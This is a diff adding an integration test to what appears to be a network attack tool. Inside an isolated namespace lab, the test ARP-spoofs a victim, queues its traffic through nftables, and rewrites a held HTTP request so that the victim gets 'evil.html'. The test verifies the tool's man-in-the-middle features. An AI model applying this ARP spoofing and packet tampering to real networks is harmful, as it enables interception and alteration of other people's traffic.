@@ -271,3 +271,103 @@ def test_dns_spoof_answers_the_victims_lookup():
                 mitm.stop()
             if sink is not None:
                 sink.terminate(); sink.wait(timeout=3)
+
+
+def test_interactive_intercept_edit_is_delivered():
+    """The operator holds the victim's request, edits it, releases it, and the
+    modified request is what actually reaches the server (hold -> edit -> deliver)."""
+    import tempfile
+
+    pytest.importorskip("netfilterqueue")
+
+    from reforge.attacks.arp_mitm import ArpMitm
+    from reforge.capture.nfqueue import NfqueueRunner, nft_forward_queue_rules
+    from reforge.core.intercept import InterceptQueue
+    from reforge.rules.actions import Hold
+    from reforge.rules.base import Rule
+    from reforge.rules.engine import RuleEngine
+    from reforge.rules.filter import parse_filter
+
+    qnum = 35
+    docroot = tempfile.mkdtemp(prefix="rf-doc-")
+    with open(os.path.join(docroot, "page.html"), "w") as fh:
+        fh.write("SAFE-CONTENT\n")
+    with open(os.path.join(docroot, "evil.html"), "w") as fh:
+        fh.write("PWNED-CONTENT\n")           # /page.html and /evil.html are same length
+
+    server = mitm = runner = rt = op = None
+    remove = []
+    stop_op = threading.Event()
+    with SegmentLab() as net:
+        try:
+            server = subprocess.Popen(
+                ["ip", "netns", "exec", "rf-gw", "python3", "-m", "http.server",
+                 "8000", "--bind", net["gateway_ip4"]],
+                cwd=docroot, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(1.0)
+
+            atk_mac = _attacker_mac()
+            mitm = ArpMitm(ATTACKER_IFACE, [net["victim_ip4"]],
+                           gateway=net["gateway_ip4"], interval=1.0)
+            assert mitm.start(), mitm.warnings
+            netns_exec("rf-victim", "ping", "-c", "1", "-W", "1", net["gateway_ip4"],
+                       check=False)
+            assert _wait_flip(net["gateway_ip4"], atk_mac), "victim never routed through us"
+
+            install, remove = nft_forward_queue_rules(qnum, victims=[net["victim_ip4"]])
+            for cmd in install:
+                subprocess.run(cmd, check=True, capture_output=True)
+
+            queue = InterceptQueue()
+            engine = RuleEngine([Rule("hold", parse_filter('Raw.load contains "/page.html"'),
+                                      [Hold()])])
+            runner = NfqueueRunner(engine, queue_num=qnum, intercept=queue)
+            rt = threading.Thread(target=runner.run, daemon=True)
+            rt.start()
+
+            # the operator: as soon as a request is held, rewrite the path and
+            # release. Rebuild through scapy (clearing checksums) exactly as the
+            # GUI packet editor does, so the edited request is valid on the wire.
+            def _edit(raw: bytes) -> bytes:
+                from scapy.layers.inet import IP, TCP
+                pkt = IP(raw.replace(b"/page.html", b"/evil.html"))
+                if pkt.haslayer(TCP):
+                    del pkt[TCP].chksum
+                del pkt.chksum
+                return bytes(pkt)
+
+            def operate():
+                while not stop_op.is_set():
+                    for hp in list(queue.pending()):
+                        queue.resolve(hp.id, "modify", _edit(hp.data))
+                    time.sleep(0.05)
+
+            op = threading.Thread(target=operate, daemon=True)
+            op.start()
+            time.sleep(0.6)
+
+            got = ""
+            for _ in range(4):
+                r = netns_exec("rf-victim", "curl", "-s", "-m", "5",
+                               f"http://{net['gateway_ip4']}:8000/page.html", check=False)
+                got = r.stdout
+                if "PWNED-CONTENT" in got:
+                    break
+                time.sleep(0.3)
+            # the victim asked for /page.html but the operator's edit delivered evil.html
+            assert "PWNED-CONTENT" in got, f"intercept edit not delivered: {got!r}"
+            assert queue.stats["modified"] >= 1
+        finally:
+            stop_op.set()
+            if op is not None:
+                op.join(timeout=2.0)
+            if runner is not None:
+                runner.stop()
+            if rt is not None:
+                rt.join(timeout=2.0)
+            for cmd in remove:
+                subprocess.run(cmd, check=False, capture_output=True)
+            if mitm is not None:
+                mitm.stop()
+            if server is not None:
+                server.terminate(); server.wait(timeout=3)
